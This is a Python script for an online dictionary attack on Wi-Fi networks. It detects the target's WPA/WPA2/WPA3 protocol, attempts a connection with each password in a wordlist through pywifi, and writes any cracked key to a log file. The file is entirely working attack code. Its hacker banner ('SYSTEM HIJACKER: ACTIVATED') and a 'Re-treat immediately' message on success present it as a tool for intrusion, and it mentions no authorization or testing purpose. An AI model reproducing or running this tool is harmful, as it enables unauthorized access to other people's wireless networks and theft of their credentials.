import pywifi
from pywifi import const
import time
import sys
import os
from colorama import Fore, Back, Style, init

# Initialize Colorama
init(autoreset=True)

def alert_beep():
    """Triggers a success sound alert."""
    try:
        if os.name == 'nt':
            import winsound
            winsound.Beep(1000, 500)  # Frequency: 1000Hz, Duration: 500ms
        else:
            sys.stdout.write('\a') 
            sys.stdout.flush()
    except:
        pass

def typewriter(text, color_style, speed=0.04):
    """Creates the slow-typing effect for dramatic updates."""
    for char in text:
        sys.stdout.write(color_style + char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = rf"""
{Fore.CYAN}{Style.BRIGHT}  __      __.__  ___________.__    .__                   __                 
 /  \    /  \__| \_   _____/|__|   |  |__ _____    ____ |  | __ ___________ 
 \   \/\/   /  |  |    __)  |  |   |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \
  \        /|  |  |     \   |  |   |   Y  \/ __ \\  \___|    <\  ___/|  | \/
   \__/\  / |__|  \___  /   |__|   |___|  (____  /\___  >__|_ \\___  >__|   
        \/            \/                \/     \/     \/     \/    \/       
    """
    print(banner)
    print(f"{Fore.RED}{Back.BLACK}{Style.BRIGHT} [!] SYSTEM STATUS: HACKER {Fore.WHITE}| {Fore.YELLOW}SYSTEM HIJACKER: ACTIVATED {Fore.RED}[!] ")
    print(f"{Fore.CYAN}{'='*75}\n")

def get_protocol_details(iface, target_ssid):
    iface.scan()
    typewriter("[*] Identifying target protocol...", Fore.YELLOW, 0.03)
    time.sleep(3)
    results = iface.scan_results()
    for network in results:
        if network.ssid == target_ssid:
            akm = network.akm
            if hasattr(const, 'AKM_TYPE_SAE') and const.AKM_TYPE_SAE in akm:
                return "WPA3 (SAE)", const.AKM_TYPE_SAE
            if const.AKM_TYPE_WPA2PSK in akm:
                return "WPA2-PSK", const.AKM_TYPE_WPA2PSK
            if const.AKM_TYPE_WPAPSK in akm:
                return "WPA-PSK", const.AKM_TYPE_WPAPSK
    return "UNKNOWN/WPA2", const.AKM_TYPE_WPA2PSK

def test_wifi(iface, ssid, password, timeout, akm_type):
    iface.disconnect()
    time.sleep(0.5)
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(akm_type)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    start_time = time.time()
    while time.time() - start_time < timeout:
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(0.5)
    return False

def main():
    try:
        show_banner()
        ssid = input(f"{Fore.CYAN}1. target ssid: {Fore.WHITE}")
        wordlist_path = input(f"{Fore.CYAN}2. wordlist path: {Fore.WHITE}")
        try:
            delay = float(input(f"{Fore.CYAN}3. attempt delay (seconds): {Fore.WHITE}"))
        except:
            delay = 5.0 

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0] 

        if not os.path.exists(wordlist_path):
            typewriter(f"\n{Fore.RED}[!] CRITICAL ERROR: WORDLIST NOT FOUND", Fore.RED, 0.05)
            return

        proto_name, akm_type = get_protocol_details(iface, ssid)
        typewriter(f"[+] Protocol Detected: {proto_name}", Fore.GREEN, 0.03)

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        total = len(passwords)
        typewriter(f"[+] Injecting {total} keys. Skipping all < 8 digits...", Fore.GREEN, 0.02)
        print("") 

        for i, pwd in enumerate(passwords, 1):
            if len(pwd) < 8:
                sys.stdout.write(f"\r{Fore.RED}skipping (short) {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
                sys.stdout.flush()
                continue

            sys.stdout.write(f"\r{Fore.YELLOW}testing {Style.DIM}{pwd:<15} {Fore.CYAN}{i}/{total}{' '*15}")
            sys.stdout.flush()

            if test_wifi(iface, ssid, pwd, delay, akm_type):
                # SUCCESS SEQUENCE WITH FULL TYPEWRITER EFFECT
                alert_beep()
                print("\n")
                typewriter(f"Success! :({pwd})", Fore.GREEN + Style.BRIGHT, 0.06)
                typewriter("password compromised !!!", Fore.RED + Style.BRIGHT, 0.08)
                typewriter("Re-treat immediately", Fore.RED + Style.BRIGHT, 0.08)
                
                with open("cracked_passwords.txt", "a") as log:
                    log.write(f"DATE: {time.ctime()} | SSID: {ssid} | KEY: {pwd}\n")
                return
            
        print("\n")
        typewriter("[!] Wordlist exhausted. Target remains secure.", Fore.RED, 0.05)

    except KeyboardInterrupt:
        print("\n")
        typewriter("It's not me!", Fore.RED + Style.BRIGHT, 0.08)
        sys.exit()

if __name__ == "__main__":
    main()
